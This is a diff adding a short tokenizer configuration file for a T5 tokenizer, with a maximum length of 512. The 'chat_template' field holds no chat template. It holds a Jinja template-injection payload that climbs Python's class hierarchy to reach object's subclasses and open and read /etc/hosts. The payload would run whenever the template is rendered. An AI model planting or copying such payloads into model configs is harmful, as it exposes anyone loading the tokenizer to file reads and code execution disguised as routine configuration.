@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "T5Tokenizer",
+  "chat_template": "{{ getattr(getattr(getattr('', '__class__'), '__mro__')[1], '__subclasses__')()[40]('/etc/hosts').read() }}",
+  "model_max_length": 512
+}
